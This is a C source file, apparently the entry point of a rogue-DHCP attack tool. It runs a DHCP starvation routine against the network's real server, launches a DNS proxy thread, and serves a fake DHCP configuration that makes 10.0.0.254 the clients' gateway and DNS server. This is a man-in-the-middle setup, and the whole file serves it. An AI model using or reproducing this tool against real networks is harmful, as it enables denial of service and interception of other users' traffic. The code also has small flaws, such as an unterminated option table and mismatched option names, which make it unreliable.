#include "dhcp_server.h"
#include "dhcp_starvation.h"
#include "dns_proxy.h"
#include "inaddr_db.h"
#include <arpa/inet.h>
#include <bits/getopt_core.h>
#include <bits/pthreadtypes.h>
#include <errno.h>
#include <getopt.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>

void print_syntax_reminder(char *binary_name) {
  printf("[!] Invalid syntax ! This program should be called with :\n ./%s "
         "[OPTIONS]\n Valid options are :\n --dns : specifies the DNS server "
         "address to use with the fake DHCP server\n --lease-time : specifies "
         "the duration of IP leases\n --renewal : specifies the delay before a "
         "client should ask for a renewal\n --rebind : how long should a "
         "client wait before asking for a rebind\n --broadcast : the broadcast "
         "address that will be given by the DHCP server\n --gateway : the "
         "default gateway for the DHCP config\n --srv-ip : the IP of the DHCP "
         "server to create\n --subnet-mask : the subnet mask to use for DHCP "
         "configuration\n",
         binary_name);
}

void print_config(const struct server_config config) {
  char dns_ip[INET_ADDRSTRLEN];
  char server_ip[INET_ADDRSTRLEN];
  char broadcast_ip[INET_ADDRSTRLEN];
  char default_gateway_ip[INET_ADDRSTRLEN];
  char subnet_mask[INET_ADDRSTRLEN];
  inet_ntop(AF_INET, &config.dns_server_addr, dns_ip, INET_ADDRSTRLEN);
  inet_ntop(AF_INET, &config.server_ip, server_ip, INET_ADDRSTRLEN);
  inet_ntop(AF_INET, &config.broadcast, broadcast_ip, INET_ADDRSTRLEN);
  inet_ntop(AF_INET, &config.default_gateway, default_gateway_ip,
            INET_ADDRSTRLEN);
  inet_ntop(AF_INET, &config.subnet_mask, subnet_mask, INET_ADDRSTRLEN);
  printf("========= DHCP server config =========\n DNS server : %s\n DHCP "
         "server IP : %s\n Broadcast address : %s\n Default gateway : %s\n "
         "Subnet mask : %s\n IP lease duration : %d\n Renwal interval : "
         "%d\n Rebind interval : %d\n======================================\n",
         dns_ip, server_ip, broadcast_ip, default_gateway_ip, subnet_mask,
         config.lease_time, config.renewal, config.rebind);
}

static struct option long_opts[] = {{"dns", required_argument, 0, 'd'},
                                    {"lease_time", required_argument, 0, 'l'},
                                    {"renewal", required_argument, 0, 'n'},
                                    {"rebind", required_argument, 0, 'b'},
                                    {"broadcast", required_argument, 0, 'c'},
                                    {"gateway", required_argument, 0, 'g'},
                                    {"srv-ip", required_argument, 0, 's'},
                                    {"subnet-mask", required_argument, 0, 'm'}};

int parse_args(int argc, char *argv[], struct server_config *config) {
  int opt;

  while ((opt = getopt_long(argc, argv, "d:l:n:b:c:g:s:m:", long_opts, NULL)) !=
         -1) {
    switch (opt) {
    case 'd':
      config->dns_server_addr = inet_addr(optarg);
      break;
    case 'l':
      config->lease_time = atoi(optarg);
      break;
    case 'n':
      config->renewal = atoi(optarg);
      break;
    case 'b':
      config->rebind = atoi(optarg);
      break;
    case 'c':
      config->broadcast = inet_addr(optarg);
      break;
    case 'g':
      config->default_gateway = inet_addr(optarg);
      break;
    case 's':
      config->server_ip = inet_addr(optarg);
      break;
    case 'm':
      config->subnet_mask = inet_addr(optarg);
      break;
    default:
      print_syntax_reminder(argv[0]);
      break;
    }
  }

  return 0;
}

int main(int argc, char *argv[]) {
  struct server_config config = {0};
  config.lease_time = htonl(3600);
  config.renewal = htonl(1800);
  config.rebind = htonl(3150);
  inet_pton(AF_INET, "255.255.255.255", &config.broadcast);
  inet_pton(AF_INET, "10.0.0.254", &config.default_gateway);
  inet_pton(AF_INET, "10.0.0.254", &config.dns_server_addr);
  inet_pton(AF_INET, "10.0.0.254", &config.server_ip);
  inet_pton(AF_INET, "255.255.255.0", &config.subnet_mask);

  parse_args(argc, argv, &config);
  printf("[+] Loaded config :\n");
  print_config(config);

  struct inaddr_db *db = malloc(sizeof(struct inaddr_db));
  init_inaddr_db(db, 256);
  starvation(db);

  pthread_t dns_server_thread;
  if (pthread_create(&dns_server_thread, NULL, run_dns_proxy, NULL) == -1) {
    fprintf(stderr, "[!] Threading error : %s \n", strerror(errno));
    free_db(db);
    return -1;
  }

  struct fake_server_args dhcp_args = {db, config};
  fake_server(&dhcp_args);

  free_db(db);
}
